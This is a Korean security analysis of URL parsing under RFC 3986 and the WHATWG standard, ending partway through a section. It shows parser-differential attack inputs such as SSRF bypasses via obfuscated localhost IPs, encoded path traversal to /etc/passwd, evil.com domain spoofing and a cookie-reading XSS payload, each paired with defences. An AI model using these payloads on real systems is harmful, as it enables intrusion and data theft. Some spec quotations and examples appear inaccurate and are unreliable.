# URL 스펙 보안 분석: RFC/스펙 원문 직접 추출

> **분석 대상**: RFC 3986 (URI Generic Syntax), WHATWG URL Living Standard
> **방법론**: 스펙 원문 직접 조회 + 최신 CVE/공격 사례 교차 분석
> **최신 사례 반영**: 2024-2025년 CVE 및 컨퍼런스 발표 포함
> **작성일**: 2026-02-08

---

## 목차

- [제1부: URL 파싱의 메타적 설계 문제](#제1부-url-파싱의-메타적-설계-문제)
- [제2부: 구현체 간 파싱 불일치 (Parser Differential)](#제2부-구현체-간-파싱-불일치-parser-differential)
- [제3부: 정규화와 비교의 보안적 함의](#제3부-정규화와-비교의-보안적-함의)
- [제4부: 최신 CVE 및 공격 사례 종합](#제4부-최신-cve-및-공격-사례-종합)
- [부록: 공격-스펙-방어 매핑 종합표](#부록-공격-스펙-방어-매핑-종합표)
- [부록: 보안 검증 체크리스트](#부록-보안-검증-체크리스트)

---

## 제1부: URL 파싱의 메타적 설계 문제

### 1. RFC 3986과 WHATWG 스펙의 근본적 차이 (스펙 충돌)

**스펙 원문 동작**:
- **RFC 3986 §3**: *"Each URI begins with a scheme name that refers to a specification for assigning identifiers within that scheme."* - Scheme은 필수 컴포넌트
- **WHATWG URL Standard §4.1**: 스펙이 scheme이 없는 상대 URL을 명시적으로 허용하며, 탭과 개행 문자를 제거하여 파싱 지속

**보안적 함의**:
두 스펙 간의 근본적 차이로 인해 **동일한 URL 문자열이 다른 파서에서 완전히 다르게 해석**될 수 있다. RFC 3986을 따르는 파서는 거부해야 할 입력을 WHATWG 호환 파서는 유효한 것으로 처리할 수 있다.

**공격 벡터**:
- **Scheme Confusion**: `"google.com/abc"` 입력 시
  - 대부분의 RFC 3986 파서: host가 비어 있음으로 판단
  - Python urllib3: host를 `google.com`, path를 `/abc`로 파싱
  - 보안 검증 레이어(RFC 파서)와 실제 요청 레이어(urllib3)가 다른 판단을 하면 **SSRF 우회** 발생

```python
# 공격 시나리오: 이중 파싱으로 SSRF 필터 우회
malicious_url = "attacker.com/redirect?to=http://internal.service"

# 1단계: 보안 필터 (RFC 3986 엄격 파서)
validator_parser.parse(malicious_url)  # host = "attacker.com" → 허용

# 2단계: 실제 요청 (urllib3 등)
actual_request(malicious_url)  # 리다이렉트 따라가서 internal.service 접근
```

**실제 사례**:
- **CVE-2024-22259, CVE-2024-22243, CVE-2024-22262** (Spring Framework): `UriComponentsBuilder`가 외부 제공 URL을 파싱할 때 호스트 검증을 우회하여 SSRF/Open Redirect 발생
- Snyk 연구 (2024): 16개 URL 파서 간 5가지 클래스의 불일치 발견 - scheme confusion, slashes confusion, backslash confusion, URL encoded data confusion, scheme mixup

**스펙 기반 방어**:
- RFC 3986 §7.6: *"Applications should not render as clear text any data after the first colon in userinfo"* - 그러나 이는 userinfo에만 적용되며, scheme confusion은 다루지 않음
- **실무 권장**: 동일한 파서를 검증과 실행 모두에서 사용. 특히 Spring의 경우 `UriComponentsBuilder` 대신 `java.net.URI` 또는 검증된 단일 라이브러리 사용

---

### 2. Userinfo 필드의 구조적 취약점 (RFC 3986 §7.5)

**스펙 원문 동작**:
- **RFC 3986 §3.2.1**: *"The userinfo subcomponent may consist of a user name and, optionally, scheme-specific information about how to gain authorization to access the resource."*
- **RFC 3986 §7.5**: *"Use of the format 'user:password' in the userinfo field is deprecated."* (그러나 여전히 문법적으로 유효)

**보안적 함의**:
RFC 3986은 `user:password` 형식을 **사용하지 말라고 권고하지만 금지하지는 않음**. 이로 인해:
1. 많은 레거시 파서가 여전히 이를 지원
2. URL이 로그, 브라우저 히스토리, 리퍼러 헤더에 평문으로 저장됨
3. `@` 문자를 이용한 **도메인 스푸핑 공격** 가능

**공격 벡터**:

```
공격 예시 1: 도메인 스푸핑
https://trusted-bank.com:fakepass@evil.com/phishing
         └────────┬────────┘           └──┬──┘
              userinfo                 실제 호스트
```

사용자는 `trusted-bank.com`을 보지만 실제로는 `evil.com`에 연결된다.

```
공격 예시 2: 로그 기반 크리덴셜 노출
https://user:S3cr3t!@internal-api.com/admin
→ 웹 서버 access.log, 프록시 로그, 브라우저 히스토리에 평문 저장
→ 로그 침해 시 크리덴셜 직접 노출
```

**실제 사례**:
- **WHATWG 브라우저 정책 변경 (2019-2020)**: Chrome, Firefox, Safari 모두 URL의 userinfo를 완전히 제거하거나 거부하도록 변경
- Node.js undici (#3220): WHATWG URL 표준 따라 credentials 자동 제거 논란

**스펙 기반 방어**:
- **WHATWG URL Standard §4.4**: *"There is no way to express a username or password within a valid URL string."* - 최신 표준은 아예 금지
- RFC 3986 §7.5 권고: *"Applications should not render as clear text any data after the first colon in userinfo"*
- **실무 권장**:
  - userinfo 필드 포함된 URL 완전 거부
  - Authorization 헤더 또는 OAuth 같은 표준 인증 메커니즘 사용
  - 로그 전처리 시 URL에서 userinfo 마스킹

---

### 3. Percent-Encoding의 이중성 (RFC 3986 §2.1)

**스펙 원문 동작**:
- **RFC 3986 §2.1**: *"A percent-encoding mechanism is used to represent a data octet in a component when that octet's corresponding character is outside the allowed set or is being used as a delimiter of, or within, the component."*
- **RFC 3986 §6.2.2.2**: *"URI normalizers should decode percent-encoded octets that correspond to unreserved characters."*
- **Critical Rule**: *"Implementations MUST NOT percent-encode or decode the same string more than once."*

**보안적 함의**:
Percent-encoding은 **데이터와 구문(syntax)을 구분하는 메커니즘**이지만, 다음 문제들이 존재:
1. **반복 인코딩 금지 규칙이 준수되지 않음**: 많은 구현체가 재귀적으로 디코딩하여 공격자가 다층 인코딩으로 필터 우회
2. **정규화 시점 불일치**: 어떤 레이어에서 디코딩하는지에 따라 다른 결과

**공격 벡터**:

```
공격 예시 1: 재귀 디코딩 악용
입력: %252e%252e%252f (즉, ../ 를 두 번 인코딩)

1차 디코딩: %2e%2e%2f
2차 디코딩: ../          ← Path traversal 성공!

스펙 준수 파서는 1차만 디코딩해야 하지만,
재귀 디코딩하는 파서는 공격자 의도대로 동작
```

```
공격 예시 2: 필터 우회
WAF 규칙: "../" 차단

공격자 입력: /%2e%2e%2f
→ WAF: 문자열 매칭 실패 → 통과
→ 백엔드: 디코딩 후 ../ 로 해석 → 디렉토리 순회
```

```
공격 예시 3: Host Validation 우회 (CVE-2024-22259 관련)
https:google.com → 정규화 → https://google.com
                                     ↑ 스킴 구분자 자동 추가
일부 파서는 자동 정규화하여 검증 우회
```

**실제 사례**:
- **CVE-2021-41773** (Apache HTTP Server 2.4.49): Path normalization 변경으로 인해 `%2e` 같은 인코딩된 경로 순회 문자가 정규화되지 않아 인증 우회 및 임의 파일 읽기 발생
- **Axios SSRF bypass (#7315)**: URL normalization이 `https:google.com` → `https://google.com`으로 자동 수정하여 SSRF 필터 우회
- **ChatGPT Account Takeover (2023)**: Path normalization 이슈로 전체 계정 탈취 가능

**스펙 기반 방어**:
- **RFC 3986 §2.4 MUST 규칙**: *"Implementations MUST NOT percent-encode or decode the same string more than once"*
- **RFC 3986 §6.2.2.2**: Unreserved 문자(`A-Za-z0-9-._~`)는 인코딩하지 말아야 하며, 발견 시 디코딩해야 함
- **실무 권장**:
  - 입력 받은 즉시 **정확히 1회만** 디코딩
  - 정규화는 보안 검증 **이전**에 완료
  - 경로 순회 패턴 검사는 디코딩 **이후** 수행
  - 재귀 디코딩 명시적 금지

---

### 4. Authority 컴포넌트의 모호성 (RFC 3986 §3.2)

**스펙 원문 동작**:
- **RFC 3986 §3.2**: *"The authority component is preceded by a double slash ('//') and is terminated by the next slash ('/'), question mark ('?'), or number sign ('#') character, or by the end of the URI."*
- **슬래시 규칙**: Authority가 있는 URI의 경로는 반드시 `/`로 시작하거나 비어야 함

**보안적 함의**:
슬래시의 개수와 위치에 따라 파서마다 다르게 해석하며, 일부 파서는 백슬래시(`\`)를 슬래시로 취급한다. 이는 **프로토콜 혼동**과 **리다이렉트 공격**의 원인이 된다.

**공격 벡터**:

```
공격 예시 1: 슬래시 개수 혼동
입력: https:/evil.com (슬래시 1개)

RFC 3986 엄격 파서: 오류 (authority 구분자 //가 불완전)
관대한 파서: evil.com을 host로 해석
→ SSRF 필터 우회
```

```
공격 예시 2: 백슬래시 혼동
입력: https:\\evil.com

Windows 기반 파서: \를 /로 변환 → evil.com 접근
Unix 기반 파서: \를 일반 문자로 취급 → 다른 해석
→ Parser differential 발생
```

```
공격 예시 3: Orange Tsai의 Confusion Attack (CVE-2024-38473)
Apache HTTP Server에서 filename 필드가 파일시스템 경로여야 하지만
일부 모듈이 이를 URL로 취급
→ 백슬래시로 NTLM 인증 강제 → SSRF → NTLM Relay → RCE
```

**실제 사례**:
- **Orange Tsai, Black Hat USA 2024**: Apache HTTP Server에서 3가지 Confusion Attack, 9개 취약점, 20개 공격 기법 발표. CVE-2024-38473, CVE-2024-38476, CVE-2024-38477 등 발견
- **SharePoint XXE (CVE-2024-30043)**: URL 파싱 혼동을 악용하여 XXE 주입 → SharePoint Farm Service 계정 권한으로 파일 읽기 + SSRF

**스펙 기반 방어**:
- **RFC 3986 §3.3**: *"If a URI contains an authority component, then the path component must either be empty or begin with a slash ('/') character."*
- **실무 권장**:
  - 슬래시 개수 엄격 검증 (정확히 2개: `//`)
  - 백슬래시를 슬래시로 자동 변환하지 말 것
  - 프로토콜별 파서 사용 시 파일시스템 경로와 URL 명확히 구분

---

### 5. 호스트 파싱의 레거시 지원 문제 (RFC 3986 §7.4)

**스펙 원문 동작**:
- **RFC 3986 §7.4**: *"Some older implementations accept IPv4 addresses that omit the dots, or that use hexadecimal or octal values for octets."*
- **WHATWG URL Standard §4.3**: IPv4 파서가 8진수(0 접두사) 및 16진수(0x 접두사) 표기를 지원하지만, 이를 "validation error"로 표시

**보안적 함의**:
레거시 호환성 때문에 **다양한 IP 주소 표기법**이 혼재하며, 이를 모두 인식하지 못하는 보안 필터를 우회할 수 있다.

**공격 벡터**:

```
공격 예시: IP 주소 난독화로 SSRF 필터 우회

목표: 127.0.0.1 (localhost) 접근

방법 1: 8진수 표기
http://0177.0.0.1  (0177 = 127)

방법 2: 16진수 표기
http://0x7f.0.0.1

방법 3: 정수 변환
http://2130706433  (127 * 256^3 + 0 * 256^2 + 0 * 256 + 1)

방법 4: 혼합
http://0177.0x00.0.01

WAF/필터: "127.0.0.1" 문자열 매칭 실패 → 통과
실제 파서: 모두 127.0.0.1로 해석 → localhost 접근 성공
```

**실제 사례**:
- **PortSwigger SSRF Labs**: IP 난독화 기법을 이용한 SSRF 우회 실습 제공
- Python urllib3: URL 인코딩된 IP 주소(`http://127.%30.%30.1`)를 `127.0.0.1`로 해석하여 예상치 못한 요청 발생

**스펙 기반 방어**:
- **RFC 3986 §7.4 권고**: *"All implementations should be prepared to accept both the traditional dotted-decimal notation and any of the alternative formats for IPv4 addresses."*
- **WHATWG 접근**: 레거시 형식을 파싱은 하되 validation error로 표시
- **실무 권장**:
  - IP 주소 모든 대체 형식 정규화 후 검증
  - 정규 표현식 매칭 대신 전용 IP 파서 사용 (`inet_pton` 등)
  - 내부 IP 범위 체크 시 정규화된 형식 기준 검사

---

### 6. Fragment Identifier의 클라이언트 측 특성 (RFC 3986 §3.5)

**스펙 원문 동작**:
- **RFC 3986 §3.5**: *"The fragment identifier component of a URI allows indirect identification of a secondary resource by reference to a primary resource and additional identifying information. The identified secondary resource may be some portion or subset of the primary resource, some view on representations of the primary resource, or some other resource defined or described by those representations."*
- **Critical**: *"Fragment identifiers are not used in the scheme-specific processing of a URI... they are not sent in the HTTP protocol."*

**보안적 함의**:
Fragment는 **서버로 전송되지 않고** 클라이언트 측에서만 처리된다. 이는:
1. 서버 측 로깅/보안 검증이 fragment를 볼 수 없음
2. 클라이언트 측 JavaScript가 fragment 기반 라우팅 시 XSS 위험
3. Fragment를 통한 민감 정보 전달은 서버 검증 불가

**공격 벡터**:

```
공격 예시 1: Fragment 기반 XSS
URL: https://vulnerable.com/#<script>alert(document.cookie)</script>

클라이언트 측 라우터 (React Router 등):
const hash = window.location.hash;
document.body.innerHTML = hash;  ← XSS 발생!

서버는 fragment를 받지 못하므로 WAF 우회
```

```
공격 예시 2: OAuth Token Leak via Fragment
OAuth Implicit Flow:
https://app.com/callback#access_token=SECRET123

리퍼러 헤더: fragment는 전송되지 않음 (안전)
BUT JavaScript: 모든 스크립트가 location.hash 접근 가능
→ 악성 Third-party 스크립트가 토큰 탈취 가능
```

```
공격 예시 3: Open Redirect 우회
서버 측 검증: 리다이렉트 URL의 호스트 체크
입력: https://trusted.com#@evil.com

서버: host = "trusted.com" → 허용
브라우저: trusted.com 로딩 후 클라이언트 측 스크립트가
         #@evil.com 파싱 → location.href 변경 → evil.com 리다이렉트
```

**실제 사례**:
- **OAuth 2.0 Implicit Flow 폐기**: Fragment를 통한 토큰 전달이 XSS 공격에 취약하여 Authorization Code Flow + PKCE로 대체 권고
- **PortSwigger Research**: Fragment-based Client-Side Template Injection 공격 패턴 발표

**스펙 기반 방어**:
- **RFC 3986 §3.5**: Fragment는 scheme-specific processing에 사용되지 않으며 HTTP 프로토콜로 전송되지 않음
- **OAuth 2.0 Security BCP**: Implicit Flow 사용 금지, fragment로 민감 정보 전달 금지
- **실무 권장**:
  - Fragment 기반 라우팅 시 입력 엄격 검증 및 sanitization
  - 민감 정보(토큰, 세션 ID)를 fragment에 절대 포함 금지
  - CSP (Content Security Policy) 강화로 인라인 스크립트 제한

---

## 제2부: 구현체 간 파싱 불일치 (Parser Differential)

### 7. Scheme 필수 여부 해석 차이 (RFC 3986 §3 vs WHATWG §4.1)

**스펙 원문 동작**:
- **RFC 3986 §3**: *"Each URI begins with a scheme name"* - Scheme을 필수로 간주
- **RFC 2396 (이전 버전)**: Scheme을 선택적으로 허용
- **WHATWG URL Standard**: 상대 URL을 명시적 지원

**보안적 함의**:
구현체마다 scheme이 없는 입력을 다르게 처리:
- 오류로 거부
- 기본 scheme 추론 (http://)
- 상대 URL로 해석

**공격 벡터**:

```python
# 공격 시나리오: Differential Parsing
url = "//evil.com/payload"

# 파서 A (RFC 3986 엄격): scheme 없음 → 오류
# 파서 B (관대한 구현): http://evil.com/payload 추론
# 파서 C (상대 URL): 현재 페이지 기준 상대 경로

if validate_with_parser_A(url):  # 오류 → 차단
    pass
else:
    fetch_with_parser_B(url)      # 추론 성공 → SSRF
```

**실제 사례**:
- **Snyk 연구 (2024)**: 16개 파서 중 대부분이 `//host/path` 형식을 다르게 해석
- Python urllib vs urllib3 vs requests 간 동작 불일치 다수 발견

**스펙 기반 방어**:
- **RFC 3986 §4.2**: 상대 참조를 명시적으로 정의하지만, 보안 컨텍스트에서 사용 주의 필요
- **실무 권장**:
  - 외부 입력은 **절대 URI만 허용** (scheme 필수)
  - 검증과 실행에 동일 파서 사용
  - 상대 URL은 신뢰된 컨텍스트에서만 허용

---

### 8. 호스트 추출 메서드 불일치 (`getHost()` 문제)

**스펙 원문 동작**:
- **RFC 3986 §3.2.2**: Host는 IP-literal, IPv4address, reg-name 중 하나
- **Java `java.net.URL.getHost()`**: URL에서 호스트 부분 추출
- **Python `urllib.parse.urlparse()`**: 6-tuple 반환 (scheme, netloc, path, params, query, fragment)

**보안적 함의**:
각 언어/라이브러리의 호스트 추출 메서드가 **edge case에서 다른 결과** 반환:
- userinfo 처리 방식
- 포트 번호 포함 여부
- 특수 문자 처리

**공격 벡터**:

```java
// Java URL Confusion (Orange Tsai, Black Hat 2017)
String url = "http://example.com@evil.com/";

// 파서 A (일부 Java 구현):
// getHost() → "evil.com"  ← 정확함

// 파서 B (레거시 구현):
// getHost() → "example.com@evil.com"  ← 잘못된 호스트

// 보안 검증
if (url.getHost().equals("example.com")) {  // 실패 (레거시) 또는 성공 (정상)
    makeRequest(url);  // evil.com으로 요청 전송
}
```

```python
# Python URL Encoding Confusion
from urllib.parse import urlparse

url = "http://127.%30.%30.1/"  # %30 = '0'

parsed = urlparse(url)
# 파서마다 다르게 해석:
# - urllib: netloc = "127.%30.%30.1" (인코딩 유지)
# - requests: 실제 요청 시 127.0.0.1로 디코딩
```

**실제 사례**:
- **Spring Framework CVE-2024-22259**: `UriComponentsBuilder.fromUriString()`과 실제 HTTP 클라이언트 간 호스트 해석 차이로 SSRF 발생
- **Log4j RCE (CVE-2021-44228)**: JNDI URL 파싱 차이를 이용한 원격 코드 실행

**스펙 기반 방어**:
- **RFC 3986 §3.2.2**: Host는 `[` 또는 `]`로 둘러싸인 IP-literal이거나, IPv4 주소이거나, registered name
- **실무 권장**:
  - 언어 표준 라이브러리의 `getHost()` 같은 메서드 신뢰하지 말 것
  - RFC 3986 기준 명시적 파싱 라이브러리 사용
  - 호스트 추출 후 IP 주소로 변환하여 재검증
  - Allow-list 기반 검증 (Deny-list는 우회 가능)

---

### 9. URL 인코딩 처리 불일치 (RFC 3986 §2.1)

**스펙 원문 동작**:
- **RFC 3986 §2.1**: *"A percent-encoded octet is encoded as a character triplet, consisting of the percent character '%' followed by the two hexadecimal digits representing that octet's numeric value."*
- **RFC 3986 §2.4**: Unreserved 문자 집합 정의

**보안적 함의**:
구현체마다 URL 디코딩 시점과 횟수가 다름:
1. **디코딩 시점**: 입력 검증 전 vs 후
2. **재귀 디코딩**: 1회 vs 반복적으로 디코딩
3. **대소문자**: `%2E` vs `%2e` 처리

**공격 벡터**:

```
공격 예시: 재귀 디코딩 차이
입력: http://example.com/%252e%252e%252f

파서 A (1회 디코딩):
→ http://example.com/%2e%2e%2f
→ 보안 검증: "../" 패턴 없음 → 통과

파서 B (재귀 디코딩):
→ http://example.com/../
→ 실제 요청: 디렉토리 순회 성공
```

```
공격 예시: SSRF 필터 우회
WAF 규칙: "127.0.0.1" 차단

입력: http://127.%30.%30.1/admin

WAF: 문자열 매칭 실패 → 통과
urllib3/requests: 127.0.0.1로 디코딩 → localhost 접근
```

**실제 사례**:
- **Python urllib URL Encoding Confusion**: urllib과 requests가 URL 인코딩된 호스트를 디코딩하여 예기치 않은 127.0.0.1 접근 발생
- **Axios normalization issue (#7315)**: `https:google.com`을 `https://google.com`으로 자동 수정하여 SSRF 필터 우회

**스펙 기반 방어**:
- **RFC 3986 §2.4 MUST**: *"Implementations MUST NOT percent-encode or decode the same string more than once"*
- **실무 권장**:
  - 입력 받은 즉시 **정확히 1회** 디코딩 (재귀 금지)
  - 디코딩 후 정규화 수행
  - 정규화 후 보안 검증
  - 검증 통과한 정규화된 URL만 사용

---

### 10. 백슬래시와 슬래시 혼동 (WHATWG vs RFC 3986)

**스펙 원문 동작**:
- **RFC 3986**: 백슬래시(`\`)를 특별히 다루지 않음 (일반 문자)
- **WHATWG URL Standard**: 특정 scheme (http, https 등)에서 백슬래시를 슬래시로 정규화

**보안적 함의**:
Windows 기반 시스템과 Unix 기반 시스템이 백슬래시를 다르게 처리하며, 일부 브라우저는 백슬래시를 슬래시로 자동 변환한다.

**공격 벡터**:

```
공격 예시 1: 프로토콜 혼동
입력: http:\\evil.com\path

Windows/WHATWG 파서: \를 /로 변환
→ http://evil.com/path

Unix 엄격 파서: \는 일반 문자
→ 호스트 부분을 다르게 파싱

보안 필터 (Unix): 호스트 = ???
실제 요청 (Windows): 호스트 = evil.com
```

```
공격 예시 2: Apache Confusion Attack (CVE-2024-38473)
Apache의 일부 모듈이 filename 필드를 URL로 취급
백슬래시를 이용하여:
→ DocumentRoot 탈출
→ NTLM 인증 강제 (UNC 경로)
→ SSRF → NTLM Relay → RCE
```

**실제 사례**:
- **Orange Tsai, Black Hat USA 2024**: Apache HTTP Server에서 백슬래시 혼동을 이용한 다양한 공격 벡터 발표
- **CVE-2024-38473, CVE-2024-38476**: Apache 2.4.60에서 패치

**스펙 기반 방어**:
- **WHATWG**: 특정 scheme에서 백슬래시를 슬래시로 정규화 (명시적 정의)
- **실무 권장**:
  - 백슬래시 포함된 URL 거부 또는 명시적 정규화
  - 파일시스템 경로와 URL 명확히 구분
  - 플랫폼 간 일관성 보장 (동일 파서 사용)

---

### 11. 탭과 개행 문자 처리 불일치 (WHATWG §4.1)

**스펙 원문 동작**:
- **WHATWG URL Standard §4.1**: *"The URL parser removes all leading and trailing C0 controls and space from the input string. It also removes all tab and newline characters from the input string."*
- **RFC 3986**: 탭과 개행 문자를 명시적으로 다루지 않음 (percent-encode 필요)

**보안적 함의**:
WHATWG 파서는 탭(`\t`)과 개행(`\n`, `\r`)을 자동으로 **제거**하여 파싱을 계속하지만, RFC 3986 엄격 파서는 이를 오류로 처리할 수 있다.

**공격 벡터**:

```
공격 예시: 탭/개행 주입으로 필터 우회
입력: http://tru\nsted.com@evil.com/

보안 필터 (문자열 매칭):
→ "trusted.com"을 찾음 → 허용

WHATWG 파서 (브라우저):
→ \n 제거 → http://trusted.com@evil.com/
→ userinfo = "trusted.com", host = "evil.com"
→ evil.com 접근
```

```
공격 예시: HTTP Request Smuggling 연계
GET /path HTTP/1.1\r\n
Host: trusted.com@evil.com\r\n\r\n

일부 파서: Host 헤더를 그대로 파싱
WHATWG 호환 파서: @evil.com만 호스트로 인식
→ Request smuggling 또는 cache poisoning
```

**실제 사례**:
- **PortSwigger Research, Black Hat 2024**: 탭/개행 제거를 이용한 Cache Key Confusion 공격 발표
- Nginx behind Cloudflare, Apache behind CloudFront에서 기본 설정으로 재현 가능

**스펙 기반 방어**:
- **WHATWG 명시적 규칙**: C0 제어 문자와 공백 제거
- **실무 권장**:
  - 입력 URL에서 탭/개행 문자 발견 시 **즉시 거부** (자동 제거 금지)
  - HTTP 헤더 파싱과 URL 파싱 일관성 보장
  - 정규 표현식 매칭 시 `\s` (공백 문자 클래스) 주의

---

## 제3부: 정규화와 비교의 보안적 함의

### 12. Case Normalization의 범위 (RFC 3986 §6.2.2.1)

**스펙 원문 동작**:
- **RFC 3986 §6.2.2.1**: *"The scheme and host are case-insensitive and therefore should be normalized to lowercase. For example, the URI 'HTTP://www.EXAMPLE.com/' is equivalent to 'http://www.example.com/'."*
- **경로는 대소문자 구분**: Path 컴포넌트는 case-sensitive

**보안적 함의**:
정규화 범위를 잘못 적용하면 보안 검증 우회:
1. Scheme/host만 소문자 변환
2. Path는 그대로 유지해야 함

**공격 벡터**:

```
공격 예시 1: 대소문자를 이용한 경로 순회
보안 규칙: "/admin" 경로 차단

입력: http://example.com/Admin
→ 대소문자 구분하지 않는 필터: 통과
→ 대소문자 구분하는 서버: /Admin != /admin → 접근 허용

또는 반대:
입력: http://example.com/admin
→ 대소문자 구분하는 필터: 차단
→ 대소문자 구분하지 않는 서버 (Windows IIS): /admin == /Admin → 접근
```

```
공격 예시 2: IDN Homograph Attack 연계
입력: http://EXАMPLE.com/  (Cyrillic А)

소문자 변환 후: http://exаmple.com/
→ 유니코드 정규화와 함께 사용 시 도메인 스푸핑
```

**실제 사례**:
- **IIS vs Apache 대소문자 처리 차이**: Windows IIS는 경로를 대소문자 구분하지 않지만, Apache/Nginx는 구분하여 parser differential 발생
- 많은 WAF가 경로를 소문자 변환하여 검사하지만, 실제 서버는 대소문자 구분하여 우회 가능

**스펙 기반 방어**:
- **RFC 3986 §6.2.2.1**: Scheme과 host만 대소문자 정규화
- **실무 권장**:
  - 보안 검증 시 서버의 대소문자 처리 방식 일치시킴
  - Windows 서버: 경로도 소문자 변환 후 검증
  - Unix 서버: 대소문자 그대로 검증
  - IDN (Internationalized Domain Name) 사용 시 Punycode 변환 후 검증

---

### 13. Percent-Encoding 정규화 (RFC 3986 §6.2.2.2)

**스펙 원문 동작**:
- **RFC 3986 §6.2.2.2**: *"URIs that differ in the replacement of an unreserved character with its corresponding percent-encoded US-ASCII octet are equivalent."*
- **Unreserved 문자**: `A-Z a-z 0-9 - . _ ~`
- **정규화 규칙**: Unreserved 문자의 인코딩은 디코딩해야 함

**보안적 함의**:
정규화되지 않은 URL과 정규화된 URL을 다른 엔티티로 취급하면:
1. 중복 캐시 엔트리 생성
2. 보안 정책 우회
3. 동일 리소스에 대한 접근 제어 불일치

**공격 벡터**:

```
공격 예시 1: 캐시 키 혼동 (Cache Key Confusion)
원본: http://example.com/api/users
변형: http://example.com/api/%75sers  (%75 = 'u')

CDN 캐시: 서로 다른 키로 취급 → 중복 캐시
→ Cache poisoning 시 정규화된 버전만 독성화
→ 사용자가 비정규화 URL 접근 시 독성 캐시 제공
```

```
공격 예시 2: 접근 제어 우회
ACL 규칙: "/admin" 차단

입력: /%61dmin  (%61 = 'a')
→ ACL: 문자열 매칭 실패 → 통과
→ 서버: 디코딩 후 /admin 처리 → 접근 성공
```

```
공격 예시 3: 중복 리소스 생성
POST /api/users HTTP/1.1
{"id": "user1"}

POST /api/%75sers HTTP/1.1
{"id": "user1"}

비정규화 API: 서로 다른 엔드포인트로 취급 → 중복 생성 또는 로직 오류
```

**실제 사례**:
- **PortSwigger Black Hat 2024**: Cache Key Confusion을 이용하여 Nginx/Cloudflare, Apache/CloudFront에서 XSS 및 기밀 정보 노출 데모
- **CVE-2021-41773** (Apache): Percent-encoding된 경로 순회 문자가 정규화되지 않아 인증 우회

**스펙 기반 방어**:
- **RFC 3986 §6.2.2.2**: Unreserved 문자는 인코딩 해제해야 함
- **RFC 3986 §6.2.2**: *"For consistency, URI producers and normalizers should use uppercase hexadecimal digits for all percent-encodings."*
- **실무 권장**:
  - 입력 받은 즉시 정규화 (unreserved 디코딩)
  - Uppercase hex digit 강제 (%2E, not %2e)
  - 정규화된 형태로 캐시 키, ACL 검사, 데이터베이스 저장
  - 동일 URL의 다양한 표현을 canonical form으로 통일

---

### 14. 경로 세그먼트 정규화 (RFC 3986 §6.2.2.3)

**스펙 원문 동작**:
- **RFC 3986 §6.2.2.3**: *"The '..' and '.' segments are removed from a URL path by applying the 'remove_dot_segments' algorithm."*
- **알고리즘**:
  - `.`는 현재 디렉토리 (제거)
  - `..`는 상위 디렉토리 (이전 세그먼트 제거)

**보안적 함의**:
경로 순회 공격의 핵심 메커니즘. 정규화 시점과 방법에 따라 보안 결과가 달라진다.

**공격 벡터**:

```
공격 예시 1: 기본 경로 순회
입력: /api/../../../etc/passwd

정규화 전 검증: "../" 패턴 발견 → 차단
정규화 후 검증: /etc/passwd → 허용 또는 차단

정규화 전 요청 전송: /api/../../../etc/passwd → 서버가 정규화 → /etc/passwd 접근
```

```
공격 예시 2: 인코딩 연계
입력: /api/%2e%2e/%2e%2e/etc/passwd

정규화 순서 1 (잘못됨):
1. 경로 정규화: "/api/%2e%2e/%2e%2e/etc/passwd" (변화 없음)
2. Percent-decode: "/api/../../etc/passwd"
3. 경로 순회 성공

정규화 순서 2 (올바름):
1. Percent-decode: "/api/../../etc/passwd"
2. 경로 정규화: "/etc/passwd"
3. 보안 검증: DocumentRoot 밖 → 차단
```

```
공격 예시 3: 경로 정규화 우회 (CVE-2021-41773)
Apache 2.4.49 경로 정규화 변경:

입력: /.%2e/etc/passwd

이전 버전: 정규화 → /../etc/passwd → /etc/passwd
2.4.49: /.%2e/를 정규화하지 않음 → 그대로 통과 → 경로 순회 성공
```

**실제 사례**:
- **CVE-2021-41773, CVE-2021-42013** (Apache 2.4.49, 2.4.50): 경로 정규화 로직 변경으로 경로 순회 취약점 발생
- **Nginx proxy_pass URL 정규화 위험**: `proxy_pass http://backend/..;` 같은 설정 시 의도하지 않은 경로 접근

**스펙 기반 방어**:
- **RFC 3986 §6.2.2.3**: `remove_dot_segments` 알고리즘 정의
  ```
  1. Input buffer에서 경로 읽기
  2. "../" 또는 "./" 접두사 제거
  3. "/./" → "/"
  4. "/../" → "/" (이전 세그먼트도 제거)
  5. 반복
  ```
- **실무 권장**:
  - **Decode → Normalize → Validate** 순서 엄수
  - 정규화 후 절대 경로가 DocumentRoot 내부인지 검증
  - Symlink 고려 (`realpath()` 사용)
  - `../` 패턴 검사는 디코딩+정규화 후 수행

---

### 15. 기본 포트 생략 정규화 (RFC 3986 §6.2.3)

**스펙 원문 동작**:
- **RFC 3986 §6.2.3**: *"The default port for a given scheme may be omitted from the authority component, as described in Section 3.2.3."*
- 예: `http://example.com:80/` ≡ `http://example.com/`

**보안적 함의**:
포트 번호 포함 여부로 인해 동일 리소스에 대한 다른 표현이 생성되며, 이를 일관되게 처리하지 않으면 보안 정책 우회 가능.

**공격 벡터**:

```
공격 예시 1: Allow-list 우회
Allow-list: "https://trusted.com/"

입력: https://trusted.com:443/redirect?to=evil.com

검증: 문자열 매칭 실패 (포트 번호 포함) → 차단
BUT 정규화 후: https://trusted.com/redirect?to=evil.com
→ 동일 리소스이지만 정책 불일치
```

```
공격 예시 2: CORS 정책 우회
CORS Allow-Origin: https://app.example.com

요청: Origin: https://app.example.com:443
→ 브라우저: 정규화하여 일치 판단
→ 서버: 문자열 매칭으로 불일치 판단
→ CORS 정책 불일치
```

```
공격 예시 3: 캐시 키 중복
CDN 캐시 키: URL 전체

http://example.com/page
http://example.com:80/page
→ 서로 다른 캐시 키 → 중복 캐시 엔트리 → 캐시 오염 공격 시 영향 범위 확대
```

**실제 사례**:
- 많은 CORS 구현체가 포트 번호 처리를 일관되게 하지 않아 보안 정책 우회 발생
- CDN 캐시 키 불일치로 인한 cache poisoning 공격 사례 다수

**스펙 기반 방어**:
- **RFC 3986 §6.2.3**: 기본 포트는 생략 가능하며, 생략된 형태와 명시된 형태는 동등
  - HTTP: 80
  - HTTPS: 443
  - FTP: 21
- **실무 권장**:
  - 입력 URL 정규화 시 기본 포트 제거
  - Allow-list, CORS 정책 등은 정규화된 형태로 저장
  - 캐시 키는 정규화된 URL 사용

---

### 16. Trailing Dot in Domain (WHATWG vs RFC)

**스펙 원문 동작**:
- **RFC 3986**: 호스트 이름의 trailing dot에 대한 명확한 규정 없음
- **WHATWG URL Standard**: `example.com`과 `example.com.`을 **서로 다른 호스트**로 취급
- **DNS**: Trailing dot은 fully-qualified domain name (FQDN)을 의미

**보안적 함의**:
Trailing dot 처리 불일치로 인해:
1. 동일 도메인의 다른 표현 생성
2. 보안 정책 우회 (CORS, CSP, cookie domain 등)

